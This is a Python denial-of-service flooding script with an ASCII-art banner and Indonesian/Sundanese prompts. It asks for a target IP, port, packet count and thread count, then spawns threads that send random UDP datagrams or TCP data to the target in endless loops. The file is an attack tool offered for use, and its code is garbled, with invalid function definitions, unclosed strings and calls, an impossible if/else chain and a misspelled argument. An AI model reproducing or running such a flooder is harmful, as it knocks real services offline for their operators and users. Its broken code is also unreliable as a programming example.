import random
import socket
import time
import threading
import os,sys

os.system("clear")
print("\033[40m)
print("""\033[40m
░██╗░░░░░░░██╗██╗███████╗███████╗██╗░░░░░██╗░░░██╗  ██╗░░██╗██╗░░░██╗███████╗
░██║░░██╗░░██║██║╚════██║╚════██║██║░░░░░╚██╗░██╔╝  ╚██╗██╔╝╚██╗░██╔╝╚════██║
░╚██╗████╗██╔╝██║░░███╔═╝░░███╔═╝██║░░░░░░╚████╔╝░  ░╚███╔╝░░╚████╔╝░░░███╔═╝
░░████╔═████║░██║██╔══╝░░██╔══╝░░██║░░░░░░░╚██╔╝░░  ░██╔██╗░░░╚██╔╝░░██╔══╝░░
░░╚██╔╝░╚██╔╝░██║███████╗███████╗███████╗░░░██║░░░  ██╔╝╚██╗░░░██║░░░███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝░░░╚═╝░░░  ╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
""")
print("RILIS TOLS MY")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GASS KEUN?(Y/N):"))
times = int(input("PAKET NYA:"))
threads = int(input("BAYAR NYA:"))
def ddos:()
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"LOCKED IP TARGET AND PORT")
		except:
			print("[X] SERVER KENDOS")

def ddos2:()
    data = random._urandom(818)
    i = random.choice(("[•]","[#]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data
            print(i + "LOCKED IP TARGET AND PORT")
        except:
            s.close()
            print("[X] SERVER KENDOS")

def ddos3:()
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"LOCKED IP TARGET AND PORT")
		except:
			print("[X] SERVER KENDOS")

def ddos4:()
    data = random._urandom(818)
    i = random.choice(("[•]","[#]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data
            print(i + "LOCKED IP TARGET AND PORT")
        except:
            s.close()
            print("[X] SERVER KENDOS")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = ddos)
        th.start()
    else:
        th = threading.Thread(target = ddos2)
        th.start()
    else:
        th = threading.Thread(target = ddos3)
        th.start()
    else:
        th = threading.Thread(targer = ddos4)
        th.start()